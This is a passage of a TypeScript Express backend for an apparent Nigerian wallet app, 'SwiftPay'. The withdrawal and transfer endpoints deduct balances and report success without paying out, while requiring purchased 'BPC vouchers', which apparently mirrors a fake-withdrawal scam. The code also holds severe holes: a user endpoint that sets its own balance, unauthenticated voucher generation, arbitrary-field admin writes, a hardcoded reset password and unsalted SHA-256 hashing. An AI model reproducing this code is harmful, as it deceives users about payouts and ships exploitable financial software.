    description: `Airtime Purchase of ₦${price.toLocaleString()} for ${phoneNumber} (${network.toUpperCase()})`,
    recipientAccount: phoneNumber,
    recipientBank: network.toUpperCase(),
    balanceBefore,
    balanceAfter,
    refNum,
    voucherCode
  };
  user.transactions.unshift(newTx);

  user.notifications = user.notifications || [];
  user.notifications.unshift({
    id: `notif-${Date.now()}`,
    title: 'Airtime Purchase Successful',
    body: `Successfully purchased ₦${price.toLocaleString()} airtime for ${phoneNumber}. BPC voucher used.`,
    date: new Date().toISOString(),
    unread: true
  });

  // Mark voucher as used
  const normVoucher = voucherCode.toUpperCase().replace(/[^A-Z0-9]/g, '');
  const vIndex = db.vouchers.findIndex((v: any) => v.code.toUpperCase().replace(/[^A-Z0-9]/g, '') === normVoucher);
  if (vIndex !== -1) {
    db.vouchers[vIndex].status = 'used';
  }

  writeDb(db);
  logDiagnostic('INFO', 'Airtime purchase complete', { email, amount: price, phoneNumber });

  res.json({
    success: true,
    balance: user.balance,
    transaction: newTx
  });
});

// Transaction endpoint for Data Purchase
app.post('/api/transactions/data', authenticateToken, (req: any, res) => {
  const { phoneNumber, network, bundleId, voucherCode } = req.body;
  const email = req.userEmail;

  if (!voucherCode) {
    return res.status(400).json({ error: "BPC voucher is required. If you don't have one, tap 'Buy BPC Voucher'." });
  }
  if (!phoneNumber || !isValidPhone(phoneNumber)) {
    return res.status(400).json({ error: "Enter a valid Nigerian phone number." });
  }
  if (!network) {
    return res.status(400).json({ error: "Please select a mobile network." });
  }
  if (!bundleId) {
    return res.status(400).json({ error: "Please select a data bundle." });
  }

  const DATA_PLANS_SERVER = [
    { id: 'mtn-500', network: 'mtn', size: '500MB', price: 150 },
    { id: 'mtn-1g', network: 'mtn', size: '1GB', price: 250 },
    { id: 'mtn-2g', network: 'mtn', size: '2GB', price: 480 },
    { id: 'mtn-3g', network: 'mtn', size: '3GB', price: 700 },
    { id: 'mtn-5g', network: 'mtn', size: '5GB', price: 1100 },
    { id: 'mtn-10g', network: 'mtn', size: '10GB', price: 2100 },
    { id: 'mtn-20g', network: 'mtn', size: '20GB', price: 4000 },
    { id: 'mtn-50g', network: 'mtn', size: '50GB', price: 9500 },
    { id: 'mtn-100g', network: 'mtn', size: '100GB', price: 18000 },

    { id: 'air-500', network: 'airtel', size: '500MB', price: 150 },
    { id: 'air-1g', network: 'airtel', size: '1GB', price: 250 },
    { id: 'air-2g', network: 'airtel', size: '2GB', price: 480 },
    { id: 'air-3g', network: 'airtel', size: '3GB', price: 700 },
    { id: 'air-5g', network: 'airtel', size: '5GB', price: 1100 },
    { id: 'air-10g', network: 'airtel', size: '10GB', price: 2100 },
    { id: 'air-20g', network: 'airtel', size: '20GB', price: 4000 },
    { id: 'air-50g', network: 'airtel', size: '50GB', price: 9500 },
    { id: 'air-100g', network: 'airtel', size: '100GB', price: 18000 },

    { id: 'glo-500', network: 'glo', size: '500MB', price: 150 },
    { id: 'glo-1g', network: 'glo', size: '1GB', price: 250 },
    { id: 'glo-2g', network: 'glo', size: '2GB', price: 480 },
    { id: 'glo-3g', network: 'glo', size: '3GB', price: 700 },
    { id: 'glo-5g', network: 'glo', size: '5GB', price: 1100 },
    { id: 'glo-10g', network: 'glo', size: '10GB', price: 2100 },
    { id: 'glo-20g', network: 'glo', size: '20GB', price: 4000 },
    { id: 'glo-50g', network: 'glo', size: '50GB', price: 9500 },
    { id: 'glo-100g', network: 'glo', size: '100GB', price: 18000 },

    { id: '9mo-500', network: '9mobile', size: '500MB', price: 150 },
    { id: '9mo-1g', network: '9mobile', size: '1GB', price: 250 },
    { id: '9mo-2g', network: '9mobile', size: '2GB', price: 480 },
    { id: '9mo-3g', network: '9mobile', size: '3GB', price: 700 },
    { id: '9mo-5g', network: '9mobile', size: '5GB', price: 1100 },
    { id: '9mo-10g', network: '9mobile', size: '10GB', price: 2100 },
    { id: '9mo-20g', network: '9mobile', size: '20GB', price: 4000 },
    { id: '9mo-50g', network: '9mobile', size: '50GB', price: 9500 },
    { id: '9mo-100g', network: '9mobile', size: '100GB', price: 18000 }
  ];

  const plan = DATA_PLANS_SERVER.find(p => p.id === bundleId);
  if (!plan) {
    return res.status(400).json({ error: "Invalid data package." });
  }

  const db = readDb();
  if (!isVoucherValid(voucherCode, db)) {
    return res.status(400).json({ error: "Invalid or already used BPC voucher." });
  }

  const userIndex = db.users.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: "User not found" });
  }
  const user = db.users[userIndex];
  const price = plan.price;

  if (user.balance < price) {
    return res.status(400).json({ error: "Insufficient wallet balance to complete this purchase" });
  }

  // Check for duplicate submission
  const isDuplicate = user.transactions && user.transactions.some((tx: any) => {
    const txTime = new Date(tx.date).getTime();
    const nowTime = Date.now();
    return (
      tx.amount === price &&
      tx.recipientAccount === phoneNumber &&
      tx.type === 'redeem_data' &&
      (nowTime - txTime) < 10000
    );
  });
  if (isDuplicate) {
    return res.status(400).json({ error: "Duplicate transaction detected. Please wait 10 seconds." });
  }

  const balanceBefore = user.balance;
  user.balance -= price;
  const balanceAfter = user.balance;
  const refNum = `REF-${Date.now()}-${Math.floor(100000 + Math.random() * 900000)}`;

  user.transactions = user.transactions || [];
  const newTx = {
    id: `tx-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
    userId: email,
    type: 'redeem_data',
    amount: price,
    date: new Date().toISOString(),
    status: 'success',
    description: `Data Purchase of ${plan.size} for ${phoneNumber} (${network.toUpperCase()})`,
    recipientAccount: phoneNumber,
    recipientBank: network.toUpperCase(),
    balanceBefore,
    balanceAfter,
    refNum,
    voucherCode
  };
  user.transactions.unshift(newTx);

  user.notifications = user.notifications || [];
  user.notifications.unshift({
    id: `notif-${Date.now()}`,
    title: 'Data Purchase Successful',
    body: `Successfully purchased ${plan.size} data bundle for ${phoneNumber}. BPC voucher used.`,
    date: new Date().toISOString(),
    unread: true
  });

  // Mark voucher as used
  const normVoucher = voucherCode.toUpperCase().replace(/[^A-Z0-9]/g, '');
  const vIndex = db.vouchers.findIndex((v: any) => v.code.toUpperCase().replace(/[^A-Z0-9]/g, '') === normVoucher);
  if (vIndex !== -1) {
    db.vouchers[vIndex].status = 'used';
  }

  writeDb(db);
  logDiagnostic('INFO', 'Data purchase complete', { email, amount: price, phoneNumber });

  res.json({
    success: true,
    balance: user.balance,
    transaction: newTx
  });
});

// Transaction endpoint for Bank Transfer
app.post('/api/transactions/transfer', authenticateToken, async (req: any, res) => {
  const { bank, accountNumber, amount, voucherCode } = req.body;
  const email = req.userEmail;

  if (!voucherCode) {
    return res.status(400).json({ error: "BPC voucher is required. If you don't have one, tap 'Buy BPC Voucher'." });
  }
  if (!bank) {
    return res.status(400).json({ error: "Please select a bank." });
  }
  if (!accountNumber || !isValidAccountNumber(accountNumber)) {
    return res.status(400).json({ error: "Please enter a valid 10-digit account number." });
  }
  if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
    return res.status(400).json({ error: "Please enter a valid transfer amount." });
  }

  const db = readDb();
  if (!isVoucherValid(voucherCode, db)) {
    return res.status(400).json({ error: "Invalid or already used BPC voucher." });
  }

  const apiKey = process.env.PAYSTACK_SECRET_KEY;
  if (!apiKey) {
    return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
  }

  let bankCode = BANK_NAME_TO_CODE[bank];
  if (!bankCode) {
    try {
      const bankRes = await fetch('https://api.paystack.co/bank?country=nigeria', {
        headers: { 'Authorization': `Bearer ${apiKey}` }
      });
      if (bankRes.ok) {
        const bankData = await bankRes.json() as any;
        if (bankData.status && Array.isArray(bankData.data)) {
          const match = bankData.data.find((b: any) => 
            b.name.toLowerCase().includes(bank.toLowerCase()) ||
            bank.toLowerCase().includes(b.name.toLowerCase())
          );
          if (match) bankCode = match.code;
        }
      }
    } catch (e) {}
  }

  if (!bankCode) {
    return res.status(400).json({ error: "Failed account verification: bank code not resolved." });
  }

  let resolvedName = '';
  try {
    const resolveRes = await fetch(`https://api.paystack.co/bank/resolve?account_number=${accountNumber}&bank_code=${bankCode}`, {
      headers: { 'Authorization': `Bearer ${apiKey}` }
    });
    const resolveData = await resolveRes.json() as any;
    if (!resolveRes.ok || !resolveData.status) {
      return res.status(400).json({ error: "Failed account verification: " + (resolveData.message || "Unable to verify account details.") });
    }
    resolvedName = resolveData.data.account_name;
  } catch (err) {
    return res.status(500).json({ error: "Failed account verification: connection error." });
  }

  const userIndex = db.users.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: "User not found" });
  }
  const user = db.users[userIndex];
  const price = Number(amount);

  if (user.balance < price) {
    return res.status(400).json({ error: "Insufficient wallet balance to complete this bank transfer" });
  }

  // Check for duplicate submission
  const isDuplicate = user.transactions && user.transactions.some((tx: any) => {
    const txTime = new Date(tx.date).getTime();
    const nowTime = Date.now();
    return (
      tx.amount === price &&
      tx.recipientAccount === accountNumber &&
      tx.type === 'bank_transfer_direct' &&
      (nowTime - txTime) < 10000
    );
  });
  if (isDuplicate) {
    return res.status(400).json({ error: "Duplicate transaction detected. Please wait 10 seconds." });
  }

  const balanceBefore = user.balance;
  user.balance -= price;
  const balanceAfter = user.balance;
  const refNum = `REF-${Date.now()}-${Math.floor(100000 + Math.random() * 900000)}`;

  user.transactions = user.transactions || [];
  const newTx = {
    id: `tx-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
    userId: email,
    type: 'bank_transfer_direct',
    amount: price,
    date: new Date().toISOString(),
    status: 'success',
    description: `Cashout ₦${price.toLocaleString()} to ${bank} (${resolvedName})`,
    recipientAccount: accountNumber,
    recipientBank: bank,
    recipientName: resolvedName,
    balanceBefore,
    balanceAfter,
    refNum,
    voucherCode
  };
  user.transactions.unshift(newTx);

  user.notifications = user.notifications || [];
  user.notifications.unshift({
    id: `notif-${Date.now()}`,
    title: 'Bank Cashout Success',
    body: `Successfully cashed out ₦${price.toLocaleString()} to ${resolvedName}. BPC voucher used.`,
    date: new Date().toISOString(),
    unread: true
  });

  // Mark voucher as used
  const normVoucher = voucherCode.toUpperCase().replace(/[^A-Z0-9]/g, '');
  const vIndex = db.vouchers.findIndex((v: any) => v.code.toUpperCase().replace(/[^A-Z0-9]/g, '') === normVoucher);
  if (vIndex !== -1) {
    db.vouchers[vIndex].status = 'used';
  }

  writeDb(db);
  logDiagnostic('INFO', 'Bank cashout complete', { email, amount: price, accountNumber });

  res.json({
    success: true,
    balance: user.balance,
    transaction: newTx,
    accountName: resolvedName
  });
});

// Transaction endpoint for Withdrawal
app.post('/api/transactions/withdraw', authenticateToken, async (req: any, res) => {
  const { bank, accountNumber, amount, voucherCode } = req.body;
  const email = req.userEmail;

  if (!voucherCode) {
    return res.status(400).json({ error: "BPC voucher is required. If you don't have one, tap 'Buy BPC Voucher'." });
  }
  if (!bank) {
    return res.status(400).json({ error: "Please select a bank." });
  }
  if (!accountNumber || !isValidAccountNumber(accountNumber)) {
    return res.status(400).json({ error: "Please enter a valid 10-digit account number." });
  }
  if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
    return res.status(400).json({ error: "Please enter a valid withdrawal amount." });
  }

  const db = readDb();
  if (!isVoucherValid(voucherCode, db)) {
    return res.status(400).json({ error: "Invalid or already used BPC voucher." });
  }

  const apiKey = process.env.PAYSTACK_SECRET_KEY;
  if (!apiKey) {
    return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
  }

  let bankCode = BANK_NAME_TO_CODE[bank];
  if (!bankCode) {
    try {
      const bankRes = await fetch('https://api.paystack.co/bank?country=nigeria', {
        headers: { 'Authorization': `Bearer ${apiKey}` }
      });
      if (bankRes.ok) {
        const bankData = await bankRes.json() as any;
        if (bankData.status && Array.isArray(bankData.data)) {
          const match = bankData.data.find((b: any) => 
            b.name.toLowerCase().includes(bank.toLowerCase()) ||
            bank.toLowerCase().includes(b.name.toLowerCase())
          );
          if (match) bankCode = match.code;
        }
      }
    } catch (e) {}
  }

  if (!bankCode) {
    return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
  }

  let resolvedName = '';
  try {
    const resolveRes = await fetch(`https://api.paystack.co/bank/resolve?account_number=${accountNumber}&bank_code=${bankCode}`, {
      headers: { 'Authorization': `Bearer ${apiKey}` }
    });
    const resolveData = await resolveRes.json() as any;
    if (!resolveRes.ok || !resolveData.status) {
      return res.status(400).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
    }
    resolvedName = resolveData.data.account_name;
  } catch (err) {
    return res.status(500).json({ error: "Account verification is temporarily unavailable. Please continue or try again later." });
  }

  const userIndex = db.users.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: "User not found" });
  }
  const user = db.users[userIndex];
  const price = Number(amount);

  if (user.balance < price) {
    return res.status(400).json({ error: "Insufficient wallet balance to complete this withdrawal" });
  }

  // Check for duplicate submission
  const isDuplicate = user.transactions && user.transactions.some((tx: any) => {
    const txTime = new Date(tx.date).getTime();
    const nowTime = Date.now();
    return (
      tx.amount === price &&
      tx.recipientAccount === accountNumber &&
      tx.type === 'withdraw' &&
      (nowTime - txTime) < 10000
    );
  });
  if (isDuplicate) {
    return res.status(400).json({ error: "Duplicate transaction detected. Please wait 10 seconds." });
  }

  const balanceBefore = user.balance;
  user.balance -= price;
  const balanceAfter = user.balance;
  const refNum = `REF-${Date.now()}-${Math.floor(100000 + Math.random() * 900000)}`;

  user.transactions = user.transactions || [];
  const newTx = {
    id: `tx-${Date.now()}-${Math.random().toString(36).substr(2, 5)}`,
    userId: email,
    type: 'withdraw',
    amount: price,
    date: new Date().toISOString(),
    status: 'success',
    description: `Withdrew ₦${price.toLocaleString()} to ${bank} (${resolvedName})`,
    recipientAccount: accountNumber,
    recipientBank: bank,
    recipientName: resolvedName,
    balanceBefore,
    balanceAfter,
    refNum,
    voucherCode
  };
  user.transactions.unshift(newTx);

  user.notifications = user.notifications || [];
  user.notifications.unshift({
    id: `notif-${Date.now()}`,
    title: 'Withdrawal Successful',
    body: `₦${price.toLocaleString()} withdrawn to ${resolvedName} (${bank}). BPC voucher used.`,
    date: new Date().toISOString(),
    unread: true
  });

  // Mark voucher as used
  const normVoucher = voucherCode.toUpperCase().replace(/[^A-Z0-9]/g, '');
  const vIndex = db.vouchers.findIndex((v: any) => v.code.toUpperCase().replace(/[^A-Z0-9]/g, '') === normVoucher);
  if (vIndex !== -1) {
    db.vouchers[vIndex].status = 'used';
  }

  writeDb(db);
  logDiagnostic('INFO', 'Withdrawal complete', { email, amount: price, accountNumber });

  res.json({
    success: true,
    balance: user.balance,
    transaction: newTx,
    accountName: resolvedName
  });
});

// Update Balance Directly
app.post('/api/auth/update-balance', authenticateToken, (req: any, res) => {
  const { balance } = req.body;
  const email = req.userEmail;

  if (balance === undefined || isNaN(Number(balance)) || Number(balance) < 0) {
    return res.status(400).json({ error: 'Valid wallet balance numerical value is required.' });
  }

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  db.users[userIndex].balance = Number(balance);
  writeDb(db);

  res.json({
    success: true,
    balance: db.users[userIndex].balance
  });
});

// Helper to generate a unique BPC voucher code
function generateVoucherCode(): string {
  const part1 = Math.floor(1000 + Math.random() * 9000);
  const part2 = Math.floor(1000 + Math.random() * 9000);
  const part3 = Math.floor(1000 + Math.random() * 9000);
  return `BPC-${part1}-${part2}-${part3}`;
}

// Purchase BPC Voucher Price Lock API
app.post('/api/vouchers/purchase', (req, res) => {
  const { email, amount } = req.body;
  if (!email || amount === undefined) {
    return res.status(400).json({ error: 'Email and amount are required.' });
  }

  const db = readDb();
  const config = db.bpcConfig || DEFAULT_BPC_CONFIG;

  if (Number(amount) !== config.voucherPrice) {
    logDiagnostic('API_ERROR', 'Purchase voucher failed: Invalid amount lock bypass attempted', { email, amount });
    return res.status(400).json({ error: `BPC Voucher price is strictly fixed at ₦${config.voucherPrice.toLocaleString()}` });
  }

  const code = generateVoucherCode();
  const newVoucher = {
    code,
    amount: config.voucherPrice,
    status: 'unused'
  };
  db.vouchers = db.vouchers || [];
  db.vouchers.push(newVoucher);

  // Add notification to user
  const userIndex = db.users.findIndex(u => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex !== -1) {
    db.users[userIndex].notifications = db.users[userIndex].notifications || [];
    db.users[userIndex].notifications.unshift({
      id: `notif-${Date.now()}`,
      title: 'BPC Voucher Purchased',
      body: `You successfully purchased a BPC Voucher. Code: ${code}. Copy and use it to complete transactions!`,
      date: new Date().toISOString(),
      unread: true
    });
  }

  writeDb(db);
  logDiagnostic('INFO', 'BPC Voucher purchased successfully', { email, code });

  res.json({
    success: true,
    code,
    message: 'BPC Purchase completed successfully! Voucher generated.'
  });
});

// Get BPC Configuration
app.get('/api/config/bpc', (req, res) => {
  const db = readDb();
  res.json({ success: true, config: db.bpcConfig || DEFAULT_BPC_CONFIG });
});

// -------------------- ADMINISTRATIVE PANEL ENDPOINTS --------------------

// Admin Login
app.post('/api/admin/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }
  const db = readDb();
  const admin = db.admins?.find(a => a.email.toLowerCase() === email.toLowerCase());
  if (!admin) {
    logDiagnostic('FAILED_LOGIN', `Admin login failed (no admin found): ${email}`);
    return res.status(400).json({ error: 'Invalid admin credentials.' });
  }
  const passwordHash = crypto.createHash('sha256').update(password).digest('hex');
  if (admin.passwordHash !== passwordHash) {
    logDiagnostic('FAILED_LOGIN', `Admin login failed (incorrect password): ${email}`);
    return res.status(400).json({ error: 'Invalid admin credentials.' });
  }
  const token = generateToken(email);
  logDiagnostic('INFO', `Admin logged in successfully: ${email}`);
  res.json({ success: true, token, email });
});

// Update BPC Configuration (Admin)
app.post('/api/admin/config/bpc', authenticateAdminToken, (req, res) => {
  const { bankName, accountNumber, accountName, whatsappLink, voucherPrice, instructions, maintenanceNotice } = req.body;
  
  const db = readDb();
  if (!db.bpcConfig) {
    db.bpcConfig = { ...DEFAULT_BPC_CONFIG };
  }
  
  if (bankName !== undefined) db.bpcConfig.bankName = bankName;
  if (accountNumber !== undefined) db.bpcConfig.accountNumber = accountNumber;
  if (accountName !== undefined) db.bpcConfig.accountName = accountName;
  if (whatsappLink !== undefined) db.bpcConfig.whatsappLink = whatsappLink;
  if (voucherPrice !== undefined && !isNaN(Number(voucherPrice))) db.bpcConfig.voucherPrice = Number(voucherPrice);
  if (instructions !== undefined) db.bpcConfig.instructions = instructions;
  if (maintenanceNotice !== undefined) db.bpcConfig.maintenanceNotice = maintenanceNotice;
  
  writeDb(db);
  logDiagnostic('SECURITY_ALERT', 'Admin updated BPC configuration', db.bpcConfig);
  res.json({ success: true, config: db.bpcConfig });
});

// List all users
app.get('/api/admin/users', authenticateAdminToken, (req, res) => {
  const db = readDb();
  const safeUsers = db.users.map((u: any) => ({
    fullName: u.fullName,
    email: u.email,
    balance: u.balance,
    dailyTarget: u.dailyTarget || 50000,
    dailySpent: u.dailySpent || 0,
    pinCreated: !!u.pinCreated,
    biometricEnabled: !!u.biometricEnabled,
    isSuspended: !!u.isSuspended,
    isFrozen: !!u.isFrozen,
    phone: u.phone || '',
    profilePic: u.profilePic || '',
    tier: u.tier || 3,
    transactions: u.transactions || []
  }));
  res.json({ success: true, users: safeUsers });
});

// Update status flags
app.post('/api/admin/users/update-status', authenticateAdminToken, (req, res) => {
  const { email, field, value } = req.body;
  if (!email || !field || value === undefined) {
    return res.status(400).json({ error: 'Please supply email, status parameter, and toggle value.' });
  }

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found.' });
  }

  db.users[userIndex][field] = !!value;
  writeDb(db);

  logDiagnostic('SECURITY_ALERT', `Admin modified status flag ${field} for user`, { email, flag: field, value });

  res.json({ success: true });
});

// Adjust balance
app.post('/api/admin/users/edit-balance', authenticateAdminToken, (req, res) => {
  const { email, balance } = req.body;
  if (!email || balance === undefined || isNaN(Number(balance))) {
    return res.status(400).json({ error: 'Please supply valid user email and numerical balance.' });
  }

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found.' });
  }

  db.users[userIndex].balance = Number(balance);
  writeDb(db);

  logDiagnostic('SECURITY_ALERT', `Admin modified user balance directly`, { email, balance: Number(balance) });

  res.json({ success: true, balance: db.users[userIndex].balance });
});

// Reset password by Admin
app.post('/api/admin/users/reset-password', authenticateAdminToken, (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Please supply email.' });
  }

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found.' });
  }

  const tempPass = 'SwiftPayAdmin99!';
  const hash = crypto.createHash('sha256').update(tempPass).digest('hex');
  db.users[userIndex].passwordHash = hash;
  writeDb(db);

  logDiagnostic('SECURITY_ALERT', `Admin performed hard credentials override`, { email });

  res.json({ success: true });
});

// Delete account by Admin
app.post('/api/admin/users/delete', authenticateAdminToken, (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Please supply email.' });
  }

  const db = readDb();
  const userIndex = db.users.findIndex((u: any) => u.email.toLowerCase() === email.toLowerCase());
  if (userIndex === -1) {
    return res.status(404).json({ error: 'User not found.' });
  }

  db.users.splice(userIndex, 1);
  writeDb(db);

  logDiagnostic('SECURITY_ALERT', 'Admin permanently deleted user account record', { email });

  res.json({ success: true });
});

// Get diagnostic logs
app.get('/api/admin/logs', authenticateAdminToken, (req, res) => {
  const db = readDb();
  res.json({ success: true, logs: db.logs || [] });
});

// Clear diagnostic logs
app.post('/api/admin/logs/clear', authenticateAdminToken, (req, res) => {
  const db = readDb();
  db.logs = [];
  writeDb(db);
  res.json({ success: true });
});

// -------------------- VITE STATIC SERVER HANDLER --------------------
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[SwiftPay Server] Enhanced Full-Stack listening at http://0.0.0.0:${PORT}`);
  });
}

startServer();
